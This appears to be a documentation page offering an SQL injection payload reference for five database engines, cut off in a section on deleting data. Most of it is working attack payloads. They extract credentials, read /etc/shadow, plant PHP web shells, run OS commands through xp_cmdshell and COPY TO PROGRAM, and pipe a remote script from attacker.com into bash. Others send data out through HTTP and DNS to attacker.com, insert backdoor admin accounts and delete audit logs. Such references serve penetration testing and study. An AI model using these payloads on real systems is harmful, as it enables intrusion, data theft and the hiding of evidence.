---
title: SQL Injection Attack
description: Complete breakdown of SQL Injection attack vectors, payload collections across all database engines, blind and out-of-band techniques, WAF bypass methods, and privilege escalation from database to operating system.
navigation:
  icon: i-lucide-syringe
  title: SQL Injection
---

## What is SQL Injection?

SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in an application's **database query construction** — allowing an attacker to interfere with the queries the application makes to its backend database. By inserting or **injecting** malicious SQL statements into input fields, an attacker can read, modify, delete data, execute administrative operations, and in some cases gain **full operating system access**.

::callout
---
icon: i-lucide-triangle-alert
color: amber
---
SQL Injection has remained in the **OWASP Top 10** since its inception. It is classified under **A03:2021 — Injection** and continues to be one of the most devastating web application vulnerabilities. A single successful SQLi can compromise an **entire database**, every user account, and potentially the underlying server.
::

SQLi occurs when the application **concatenates untrusted user input** directly into SQL queries without proper sanitization or parameterization.

```text [Vulnerable Query Construction]
# User input:
username = admin' OR '1'='1

# Application builds query via concatenation:
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"

# Resulting SQL:
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'

# The OR '1'='1' condition is always true → Authentication bypassed
```

---

## Types of SQL Injection

Understanding each type is essential for comprehensive testing. Different scenarios require different techniques.

::card-group
  ::card
  ---
  title: In-Band (Classic)
  icon: i-lucide-monitor
  ---
  Attacker uses the **same communication channel** to inject and retrieve results. Includes **Error-Based** and **UNION-Based** techniques. The easiest and most common type.
  ::

  ::card
  ---
  title: Blind SQLi
  icon: i-lucide-eye-off
  ---
  Application **does not return SQL errors or query output** in responses. Attacker infers data through **Boolean-based** (true/false) or **Time-based** (delay) responses.
  ::

  ::card
  ---
  title: Out-of-Band (OOB)
  icon: i-lucide-radio
  ---
  Data is exfiltrated through a **different channel** — DNS lookups, HTTP requests to attacker server. Used when in-band and blind are unreliable.
  ::

  ::card
  ---
  title: Second-Order
  icon: i-lucide-clock
  ---
  Malicious SQL is **stored** in the database and **executed later** when retrieved by a different query. Harder to detect and exploit.
  ::

  ::card
  ---
  title: Error-Based
  icon: i-lucide-alert-triangle
  ---
  Forces the database to produce **error messages** that contain data. Extract information through verbose error output.
  ::

  ::card
  ---
  title: Stacked Queries
  icon: i-lucide-layers
  ---
  Injects **multiple SQL statements** separated by semicolons. Enables INSERT, UPDATE, DELETE, and even command execution alongside the original query.
  ::
::

---

## Attack Flow & Methodology

::steps{level="3"}

### Step 1 — Identify Injection Points

Map all user inputs that interact with the database.

```text [Common Injection Points]
# URL Parameters
https://target.com/products?id=1
https://target.com/search?q=laptop
https://target.com/user?name=admin

# POST Body Parameters
username=admin&password=pass123
{"email": "user@test.com", "sort": "name"}

# HTTP Headers
Cookie: session=abc; user_id=1
User-Agent: Mozilla/5.0
Referer: https://target.com/page
X-Forwarded-For: 127.0.0.1

# Other Inputs
REST API path parameters: /api/users/1
GraphQL variables: {"userId": "1"}
SOAP/XML body elements
File upload filenames
```

### Step 2 — Detect SQL Injection

Inject test payloads and observe application behavior changes.

| Test Payload | Expected Behavior if Vulnerable |
|---|---|
| `'` | SQL error message or different response |
| `''` | Normal response (escaped quote) |
| `' OR '1'='1` | Returns all records / bypasses filter |
| `' OR '1'='2` | Normal response (false condition) |
| `' AND '1'='1` | Normal response (true condition) |
| `' AND '1'='2` | Empty/different response (false condition) |
| `1 AND 1=1` | Normal response |
| `1 AND 1=2` | Different/empty response |
| `' WAITFOR DELAY '0:0:5' --` | 5-second delay (MSSQL) |
| `' AND SLEEP(5) --` | 5-second delay (MySQL) |
| `'; SELECT pg_sleep(5) --` | 5-second delay (PostgreSQL) |
| `1 UNION SELECT NULL --` | Error or additional data |

### Step 3 — Determine Database Type

Identify the backend database engine to craft engine-specific payloads.

::tabs
  :::tabs-item{icon="i-lucide-database" label="Fingerprinting"}

  | Technique | MySQL | PostgreSQL | MSSQL | Oracle | SQLite |
  |-----------|-------|-----------|-------|--------|--------|
  | Version | `VERSION()` | `version()` | `@@version` | `SELECT banner FROM v$version` | `sqlite_version()` |
  | String Concat | `CONCAT('a','b')` | `'a'\|\|'b'` | `'a'+'b'` | `'a'\|\|'b'` | `'a'\|\|'b'` |
  | Comment | `-- ` or `#` | `--` | `--` | `--` | `--` |
  | Sleep | `SLEEP(5)` | `pg_sleep(5)` | `WAITFOR DELAY '0:0:5'` | `DBMS_LOCK.SLEEP(5)` | N/A |
  | Substring | `SUBSTRING()` | `SUBSTRING()` | `SUBSTRING()` | `SUBSTR()` | `SUBSTR()` |
  | If Statement | `IF(1=1,a,b)` | `CASE WHEN 1=1 THEN a ELSE b END` | `IIF(1=1,a,b)` | `CASE WHEN 1=1 THEN a ELSE b END` | `CASE WHEN 1=1 THEN a ELSE b END` |

  :::
::

### Step 4 — Extract Data

Use the appropriate technique (UNION, Error, Blind, OOB) to extract database contents.

### Step 5 — Escalate Privileges

Move from database access to operating system access where possible.

::

---

## In-Band SQL Injection Payloads

### UNION-Based Injection

UNION-Based SQLi is the most efficient extraction method — it appends a second query's results to the original query output.

::tabs
  :::tabs-item{icon="i-lucide-list-ordered" label="Column Enumeration"}

  Before using UNION, you must determine the **exact number of columns** in the original query.

  ::code-group
  ```text [ORDER BY Method]
  # Increment until error occurs
  ' ORDER BY 1 --
  ' ORDER BY 2 --
  ' ORDER BY 3 --
  ' ORDER BY 4 --
  ' ORDER BY 5 --     ← Error here means 4 columns

  # URL encoded
  ?id=1+ORDER+BY+1--
  ?id=1+ORDER+BY+2--
  ?id=1+ORDER+BY+3--
  ```

  ```text [UNION SELECT NULL Method]
  # Add NULLs until no error
  ' UNION SELECT NULL --
  ' UNION SELECT NULL,NULL --
  ' UNION SELECT NULL,NULL,NULL --
  ' UNION SELECT NULL,NULL,NULL,NULL --    ← Success = 4 columns

  # Identify string-compatible columns
  ' UNION SELECT 'a',NULL,NULL,NULL --
  ' UNION SELECT NULL,'a',NULL,NULL --
  ' UNION SELECT NULL,NULL,'a',NULL --
  ' UNION SELECT NULL,NULL,NULL,'a' --
  ```

  ```text [GROUP BY Method]
  ' GROUP BY 1 --
  ' GROUP BY 1,2 --
  ' GROUP BY 1,2,3 --
  ' GROUP BY 1,2,3,4 --
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-database" label="Data Extraction — MySQL"}

  ::code-group
  ```text [Database Enumeration]
  # Current database
  ' UNION SELECT database(),NULL,NULL,NULL --

  # All databases
  ' UNION SELECT GROUP_CONCAT(schema_name),NULL,NULL,NULL FROM information_schema.schemata --

  # Database version
  ' UNION SELECT VERSION(),NULL,NULL,NULL --

  # Current user
  ' UNION SELECT user(),NULL,NULL,NULL --
  ' UNION SELECT current_user(),NULL,NULL,NULL --

  # All users
  ' UNION SELECT GROUP_CONCAT(user,0x3a,password),NULL,NULL,NULL FROM mysql.user --
  ```

  ```text [Table Enumeration]
  # All tables in current database
  ' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database() --

  # All tables in specific database
  ' UNION SELECT GROUP_CONCAT(table_name),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='target_db' --

  # Table count
  ' UNION SELECT COUNT(*),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database() --
  ```

  ```text [Column Enumeration]
  # All columns in a table
  ' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' --

  # Columns with data types
  ' UNION SELECT GROUP_CONCAT(column_name,0x3a,data_type),NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' --
  ```

  ```text [Data Extraction]
  # Extract usernames and passwords
  ' UNION SELECT GROUP_CONCAT(username,0x3a,password),NULL,NULL,NULL FROM users --

  # With separator formatting
  ' UNION SELECT GROUP_CONCAT(username,0x7c,email,0x7c,password SEPARATOR 0x0a),NULL,NULL,NULL FROM users --

  # Limit rows
  ' UNION SELECT username,password,email,NULL FROM users LIMIT 0,1 --
  ' UNION SELECT username,password,email,NULL FROM users LIMIT 1,1 --
  ' UNION SELECT username,password,email,NULL FROM users LIMIT 2,1 --

  # Extract specific user
  ' UNION SELECT username,password,email,NULL FROM users WHERE username='admin' --
  ```

  ```text [File Read / Write — MySQL]
  # Read files from server
  ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL,NULL --
  ' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL,NULL --
  ' UNION SELECT LOAD_FILE('/etc/shadow'),NULL,NULL,NULL --
  ' UNION SELECT LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'),NULL,NULL,NULL --

  # Write files (web shell)
  ' UNION SELECT '<?php system($_GET["cmd"]); ?>',NULL,NULL,NULL INTO OUTFILE '/var/www/html/shell.php' --
  ' UNION SELECT '<?php echo shell_exec($_REQUEST["c"]); ?>',NULL,NULL,NULL INTO OUTFILE '/var/www/html/cmd.php' --

  # Write to temp
  ' UNION SELECT 'test',NULL,NULL,NULL INTO OUTFILE '/tmp/test.txt' --
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-database" label="Data Extraction — PostgreSQL"}

  ::code-group
  ```text [Database Enumeration]
  # Current database
  ' UNION SELECT current_database(),NULL,NULL,NULL --

  # All databases
  ' UNION SELECT string_agg(datname,','),NULL,NULL,NULL FROM pg_database --

  # Version
  ' UNION SELECT version(),NULL,NULL,NULL --

  # Current user
  ' UNION SELECT current_user,NULL,NULL,NULL --

  # All users
  ' UNION SELECT string_agg(usename||':'||passwd,','),NULL,NULL,NULL FROM pg_shadow --
  ```

  ```text [Table Enumeration]
  # All tables
  ' UNION SELECT string_agg(tablename,','),NULL,NULL,NULL FROM pg_tables WHERE schemaname='public' --

  # Tables from information_schema
  ' UNION SELECT string_agg(table_name,','),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema='public' --
  ```

  ```text [Column Enumeration]
  ' UNION SELECT string_agg(column_name,','),NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users' --
  ```

  ```text [Data Extraction]
  ' UNION SELECT string_agg(username||':'||password,E'\n'),NULL,NULL,NULL FROM users --

  # File read
  ' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL,NULL --
  ' UNION SELECT pg_read_file('/var/www/html/config.php',0,10000),NULL,NULL,NULL --
  ```

  ```text [Command Execution — PostgreSQL]
  # Create command execution function
  '; CREATE OR REPLACE FUNCTION cmd(text) RETURNS text AS $$ BEGIN RETURN (SELECT * FROM pg_read_file($1)); END; $$ LANGUAGE plpgsql; --

  # Using COPY
  '; COPY (SELECT '') TO PROGRAM 'id > /tmp/output.txt'; --
  '; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/shell.sh | bash'; --

  # Large object method
  '; SELECT lo_import('/etc/passwd'); --
  '; SELECT lo_export(12345, '/var/www/html/passwd.txt'); --
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-database" label="Data Extraction — MSSQL"}

  ::code-group
  ```text [Database Enumeration]
  # Current database
  ' UNION SELECT DB_NAME(),NULL,NULL,NULL --

  # All databases
  ' UNION SELECT STRING_AGG(name,','),NULL,NULL,NULL FROM sys.databases --
  ' UNION SELECT name,NULL,NULL,NULL FROM master..sysdatabases --

  # Version
  ' UNION SELECT @@version,NULL,NULL,NULL --

  # Current user
  ' UNION SELECT SYSTEM_USER,NULL,NULL,NULL --
  ' UNION SELECT USER_NAME(),NULL,NULL,NULL --

  # Server name
  ' UNION SELECT @@servername,NULL,NULL,NULL --

  # Is sysadmin?
  ' UNION SELECT IS_SRVROLEMEMBER('sysadmin'),NULL,NULL,NULL --
  ```

  ```text [Table Enumeration]
  # All tables
  ' UNION SELECT STRING_AGG(name,','),NULL,NULL,NULL FROM sysobjects WHERE xtype='U' --
  ' UNION SELECT TABLE_NAME,NULL,NULL,NULL FROM information_schema.tables --
  ```

  ```text [Column Enumeration]
  ' UNION SELECT STRING_AGG(COLUMN_NAME,','),NULL,NULL,NULL FROM information_schema.columns WHERE TABLE_NAME='users' --
  ```

  ```text [Data Extraction]
  ' UNION SELECT username+':'+password,NULL,NULL,NULL FROM users --
  ```

  ```text [Command Execution — MSSQL]
  # xp_cmdshell (if enabled)
  '; EXEC xp_cmdshell 'whoami'; --
  '; EXEC xp_cmdshell 'dir C:\'; --
  '; EXEC xp_cmdshell 'type C:\inetpub\wwwroot\web.config'; --
  '; EXEC xp_cmdshell 'net user hacker Password1! /add'; --
  '; EXEC xp_cmdshell 'net localgroup Administrators hacker /add'; --

  # Enable xp_cmdshell if disabled
  '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; --
  '; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --

  # OLE Automation
  '; DECLARE @s INT; EXEC sp_oacreate 'wscript.shell',@s OUT; EXEC sp_oamethod @s,'run',NULL,'cmd /c whoami > C:\output.txt'; --

  # Read files
  '; CREATE TABLE tmp(data NVARCHAR(MAX)); BULK INSERT tmp FROM 'C:\Windows\System32\drivers\etc\hosts'; SELECT * FROM tmp; --
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-database" label="Data Extraction — Oracle"}

  ::code-group
  ```text [Database Enumeration]
  # Current user
  ' UNION SELECT user,NULL,NULL,NULL FROM dual --

  # All users
  ' UNION SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username),NULL,NULL,NULL FROM all_users --

  # Version
  ' UNION SELECT banner,NULL,NULL,NULL FROM v$version WHERE ROWNUM=1 --

  # Current database (SID)
  ' UNION SELECT global_name,NULL,NULL,NULL FROM global_name --

  # Database name
  ' UNION SELECT ora_database_name,NULL,NULL,NULL FROM dual --
  ```

  ```text [Table Enumeration]
  ' UNION SELECT LISTAGG(table_name,',') WITHIN GROUP (ORDER BY table_name),NULL,NULL,NULL FROM all_tables WHERE owner='SCHEMA_NAME' --

  # User tables
  ' UNION SELECT table_name,NULL,NULL,NULL FROM user_tables WHERE ROWNUM<=20 --
  ```

  ```text [Column Enumeration]
  ' UNION SELECT LISTAGG(column_name,',') WITHIN GROUP (ORDER BY column_id),NULL,NULL,NULL FROM all_tab_columns WHERE table_name='USERS' --
  ```

  ```text [Data Extraction]
  ' UNION SELECT username||':'||password,NULL,NULL,NULL FROM users WHERE ROWNUM<=10 --
  ```

  ```text [File Read / Command Execution — Oracle]
  # Read files via UTL_FILE
  -- Requires DBA privileges and directory object

  # DNS exfiltration
  ' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT username FROM users WHERE ROWNUM=1)||'.attacker.com'),NULL,NULL,NULL FROM dual --

  # HTTP request (data exfiltration)
  ' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT username FROM users WHERE ROWNUM=1)),NULL,NULL,NULL FROM dual --

  # Java execution (if Java is installed)
  '; EXEC DBMS_JAVA.RUNJAVA('com/sun/tools/script/shell -e "Runtime.getRuntime().exec(\"id\")"'); --
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-database" label="Data Extraction — SQLite"}

  ::code-group
  ```text [Database Enumeration]
  # SQLite version
  ' UNION SELECT sqlite_version(),NULL,NULL,NULL --

  # All tables
  ' UNION SELECT GROUP_CONCAT(name),NULL,NULL,NULL FROM sqlite_master WHERE type='table' --

  # Table creation SQL (reveals columns)
  ' UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master WHERE type='table' AND name='users' --
  ```

  ```text [Column Enumeration]
  # Get table info
  ' UNION SELECT GROUP_CONCAT(name||':'||type),NULL,NULL,NULL FROM pragma_table_info('users') --

  # From sqlite_master SQL
  ' UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master WHERE tbl_name='users' --
  ```

  ```text [Data Extraction]
  ' UNION SELECT GROUP_CONCAT(username||':'||password,char(10)),NULL,NULL,NULL FROM users --

  # With LIMIT
  ' UNION SELECT username,password,email,NULL FROM users LIMIT 1 OFFSET 0 --
  ' UNION SELECT username,password,email,NULL FROM users LIMIT 1 OFFSET 1 --
  ```

  ```text [File Operations — SQLite]
  # Attach another database file
  '; ATTACH DATABASE '/var/www/html/shell.php' AS shell; --
  '; CREATE TABLE shell.exec(code TEXT); --
  '; INSERT INTO shell.exec VALUES('<?php system($_GET["cmd"]); ?>'); --
  ```
  ::
  :::
::

### Error-Based Injection

Extract data through intentionally triggered database error messages.

::code-group
```text [MySQL — Error-Based]
# ExtractValue
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e)) --
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e)) --
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM users),0x7e)) --

# UpdateXML
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1) --
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1) --
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT password FROM users WHERE username='admin'),0x7e),1) --

# Double Query (subquery error)
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT password FROM users LIMIT 0,1),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --

# Geometric functions
' AND GeometryCollection((SELECT * FROM (SELECT * FROM (SELECT GROUP_CONCAT(username,0x3a,password) FROM users)a)b)) --

# JSON errors (MySQL 5.7+)
' AND JSON_KEYS((SELECT CONVERT((SELECT GROUP_CONCAT(username,0x3a,password) FROM users) USING utf8))) --

# EXP overflow (MySQL 5.5-5.6)
' AND EXP(~(SELECT * FROM (SELECT database())a)) --
```

```text [PostgreSQL — Error-Based]
# CAST error
' AND 1=CAST((SELECT version()) AS INT) --
' AND 1=CAST((SELECT current_database()) AS INT) --
' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS INT) --
' AND 1=CAST((SELECT string_agg(username||':'||password,',') FROM users) AS INT) --

# RAISE NOTICE (if available)
'; DO $$ BEGIN RAISE NOTICE '%', (SELECT string_agg(username,',') FROM users); END $$; --
```

```text [MSSQL — Error-Based]
# CONVERT error
' AND 1=CONVERT(INT,(SELECT DB_NAME())) --
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')) --
' AND 1=CONVERT(INT,(SELECT TOP 1 username FROM users)) --
' AND 1=CONVERT(INT,(SELECT TOP 1 username+':'+password FROM users)) --

# CAST error
' AND 1=CAST((SELECT TOP 1 name FROM sys.databases) AS INT) --

# Having/Group By error
' HAVING 1=1 --
' GROUP BY column1 HAVING 1=1 --
```

```text [Oracle — Error-Based]
# CTXSYS.DRITHSX.SN
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual)) --
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) --

# UTL_INADDR
' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)) --

# DBMS_UTILITY
' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT user FROM dual)) --

# XMLType
' AND (SELECT XMLType('<:'||(SELECT user FROM dual)||'>') FROM dual) IS NOT NULL --
```
::

---

## Blind SQL Injection Payloads

When the application returns **no visible SQL output or errors** — only behavioral differences.

::tabs
  :::tabs-item{icon="i-lucide-toggle-left" label="Boolean-Based Blind"}

  ::code-group
  ```text [Boolean — MySQL]
  # Determine database name length
  ' AND LENGTH(database())=1 --        # False
  ' AND LENGTH(database())=5 --        # False
  ' AND LENGTH(database())=8 --        # True → DB name is 8 chars

  # Extract database name character by character
  ' AND SUBSTRING(database(),1,1)='a' --    # False
  ' AND SUBSTRING(database(),1,1)='t' --    # True → First char is 't'
  ' AND SUBSTRING(database(),2,1)='a' --    # True → Second char is 'a'
  ' AND SUBSTRING(database(),3,1)='r' --    # ...

  # Using ASCII values (faster — binary search)
  ' AND ASCII(SUBSTRING(database(),1,1))>96 --     # True (lowercase)
  ' AND ASCII(SUBSTRING(database(),1,1))>112 --    # True
  ' AND ASCII(SUBSTRING(database(),1,1))>120 --    # False
  ' AND ASCII(SUBSTRING(database(),1,1))>116 --    # False
  ' AND ASCII(SUBSTRING(database(),1,1))=116 --    # True → 't'

  # Table enumeration
  ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0 --
  ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5 --
  ' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u' --

  # Data extraction
  ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --
  ' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>96 --

  # Using IF
  ' AND IF(1=1,'a','b')='a' --    # True baseline
  ' AND IF(SUBSTRING(database(),1,1)='t','a','b')='a' --
  ```

  ```text [Boolean — PostgreSQL]
  ' AND LENGTH(current_database())=8 --
  ' AND SUBSTRING(current_database(),1,1)='t' --
  ' AND ASCII(SUBSTRING(current_database(),1,1))>116 --

  # Table check
  ' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public')>0 --
  ' AND SUBSTRING((SELECT tablename FROM pg_tables WHERE schemaname='public' LIMIT 1),1,1)='u' --
  ```

  ```text [Boolean — MSSQL]
  ' AND LEN(DB_NAME())=8 --
  ' AND SUBSTRING(DB_NAME(),1,1)='t' --
  ' AND ASCII(SUBSTRING(DB_NAME(),1,1))>116 --
  ' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --
  ' AND SUBSTRING((SELECT TOP 1 name FROM sysobjects WHERE xtype='U'),1,1)='u' --
  ```

  ```text [Boolean — Oracle]
  ' AND LENGTH((SELECT user FROM dual))=5 --
  ' AND SUBSTR((SELECT user FROM dual),1,1)='A' --
  ' AND ASCII(SUBSTR((SELECT user FROM dual),1,1))>64 --
  ' AND (SELECT COUNT(*) FROM user_tables)>0 --
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-timer" label="Time-Based Blind"}

  ::code-group
  ```text [Time-Based — MySQL]
  # Basic delay test
  ' AND SLEEP(5) --
  ' OR SLEEP(5) --
  1' AND SLEEP(5) AND '1'='1

  # Conditional delay
  ' AND IF(1=1,SLEEP(5),0) --        # Delays 5 seconds
  ' AND IF(1=2,SLEEP(5),0) --        # No delay

  # Extract database name
  ' AND IF(LENGTH(database())=8,SLEEP(5),0) --
  ' AND IF(SUBSTRING(database(),1,1)='t',SLEEP(5),0) --
  ' AND IF(ASCII(SUBSTRING(database(),1,1))>116,SLEEP(5),0) --

  # Extract data
  ' AND IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a',SLEEP(5),0) --

  # BENCHMARK alternative (heavy computation)
  ' AND IF(1=1,BENCHMARK(10000000,SHA1('test')),0) --

  # Table existence
  ' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0) --
  ```

  ```text [Time-Based — PostgreSQL]
  # Basic delay
  '; SELECT pg_sleep(5); --
  ' AND 1=(SELECT CASE WHEN 1=1 THEN (SELECT pg_sleep(5))::TEXT ELSE '0' END)::INT --

  # Conditional delay
  ' AND CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END IS NOT NULL --
  ' AND CASE WHEN (LENGTH(current_database())=8) THEN pg_sleep(5) ELSE pg_sleep(0) END IS NOT NULL --
  ' AND CASE WHEN (SUBSTRING(current_database(),1,1)='t') THEN pg_sleep(5) ELSE pg_sleep(0) END IS NOT NULL --

  # Generate_series for delay
  ' AND 1=(SELECT COUNT(*) FROM generate_series(1,10000000)) --
  ```

  ```text [Time-Based — MSSQL]
  # Basic delay
  '; WAITFOR DELAY '0:0:5'; --
  ' AND 1=1; WAITFOR DELAY '0:0:5'; --

  # Conditional delay
  '; IF (1=1) WAITFOR DELAY '0:0:5'; --
  '; IF (LEN(DB_NAME())=8) WAITFOR DELAY '0:0:5'; --
  '; IF (SUBSTRING(DB_NAME(),1,1)='t') WAITFOR DELAY '0:0:5'; --
  '; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:5'; --

  # Extract data
  '; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>96) WAITFOR DELAY '0:0:5'; --

  # Stacked with heavy query
  '; IF (1=1) (SELECT COUNT(*) FROM sys.all_columns a CROSS JOIN sys.all_columns b); --
  ```

  ```text [Time-Based — Oracle]
  # DBMS_PIPE.RECEIVE_MESSAGE
  ' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END --
  ' AND 1=CASE WHEN (LENGTH(USER)=5) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END --

  # DBMS_LOCK.SLEEP
  '; BEGIN DBMS_LOCK.SLEEP(5); END; --

  # Heavy query alternative
  ' AND 1=(SELECT COUNT(*) FROM all_objects a, all_objects b, all_objects c WHERE ROWNUM<=1000000) --

  # UTL_HTTP (network delay)
  ' AND UTL_HTTP.REQUEST('http://attacker.com/delay')='x' --
  ```

  ```text [Time-Based — SQLite]
  # SQLite doesn't have SLEEP — use heavy operations
  ' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2)))) --

  # Or using recursive CTE
  ' AND 1=(WITH RECURSIVE cnt(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM cnt LIMIT 100000000) SELECT COUNT(*) FROM cnt) --
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-radio" label="Out-of-Band (OOB)"}

  ::code-group
  ```text [OOB — MySQL]
  # DNS exfiltration via LOAD_FILE
  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a')),NULL,NULL,NULL --
  ' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.COLLABORATOR_ID.burpcollaborator.net\\\\a')),NULL,NULL,NULL --

  # Extract specific data
  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin'),'.attacker.com\\a')),NULL,NULL,NULL --

  # Using INTO OUTFILE (write to web root)
  ' UNION SELECT @@version,NULL,NULL,NULL INTO OUTFILE '/var/www/html/output.txt' --
  ```

  ```text [OOB — MSSQL]
  # DNS via xp_dirtree
  '; EXEC master.dbo.xp_dirtree '\\attacker.com\test'; --
  '; DECLARE @d VARCHAR(1024); SET @d=DB_NAME()+'.attacker.com'; EXEC master.dbo.xp_dirtree '\\'+@d+'\a'; --

  # DNS via xp_fileexist
  '; EXEC master.dbo.xp_fileexist '\\attacker.com\test'; --

  # DNS with data exfiltration
  '; DECLARE @q VARCHAR(1024); SET @q=(SELECT TOP 1 password FROM users); EXEC('master..xp_dirtree "\\'+@q+'.attacker.com\x"'); --

  # HTTP request via xp_cmdshell
  '; EXEC xp_cmdshell 'curl http://attacker.com/?data='+DB_NAME(); --
  '; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest http://attacker.com/?d=$(whoami)"'; --

  # OPENROWSET (if enabled)
  '; SELECT * FROM OPENROWSET('SQLOLEDB','server=attacker.com;uid=sa;pwd=;database=master','SELECT 1'); --
  ```

  ```text [OOB — PostgreSQL]
  # DNS via dblink
  '; SELECT dblink_connect('host=attacker.com user='||current_database()||' dbname=test'); --

  # COPY to program (HTTP exfil)
  '; COPY (SELECT string_agg(username||':'||password,',') FROM users) TO PROGRAM 'curl http://attacker.com/exfil -d @-'; --

  # pg_read_file + curl
  '; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/?data='||(SELECT string_agg(username,',') FROM users); --
  ```

  ```text [OOB — Oracle]
  # UTL_HTTP request
  ' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)),NULL,NULL,NULL FROM dual --
  ' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT password FROM users WHERE ROWNUM=1)),NULL,NULL,NULL FROM dual --

  # UTL_INADDR DNS lookup
  ' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com'),NULL,NULL,NULL FROM dual --
  ' UNION SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT password FROM users WHERE ROWNUM=1)||'.attacker.com'),NULL,NULL,NULL FROM dual --

  # HTTPURITYPE
  ' UNION SELECT HTTPURITYPE('http://attacker.com/'||(SELECT user FROM dual)).GETCLOB(),NULL,NULL,NULL FROM dual --

  # DBMS_LDAP
  '; SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.attacker.com',389) FROM dual; --
  ```
  ::
  :::
::

---

## Stacked Queries & Data Manipulation

Stacked queries allow executing **multiple SQL statements** in a single injection — enabling INSERT, UPDATE, DELETE, and administrative commands.

::code-group
```text [Insert Backdoor Admin Account]
# MySQL
'; INSERT INTO users (username,password,email,role) VALUES ('backdoor','$2b$10$hashed_password','attacker@evil.com','admin'); --

# PostgreSQL
'; INSERT INTO users (username,password,email,role) VALUES ('backdoor','hashed_pass','attacker@evil.com','admin'); --

# MSSQL
'; INSERT INTO users (username,password,email,role) VALUES ('backdoor','hashed_pass','attacker@evil.com','admin'); --
```

```text [Update Existing Admin Password]
# MySQL
'; UPDATE users SET password='new_hashed_password' WHERE username='admin'; --

# Change email for password reset takeover
'; UPDATE users SET email='attacker@evil.com' WHERE username='admin'; --

# Elevate own privileges
'; UPDATE users SET role='admin',is_superuser=1 WHERE username='attacker'; --
```

```text [Delete Data / Cover Tracks]
# Delete specific logs
'; DELETE FROM audit_log WHERE action LIKE '%injection%'; --
'; DELETE FROM access_log WHERE ip_address='attacker_ip'; --

# Truncate tables (destructive!)
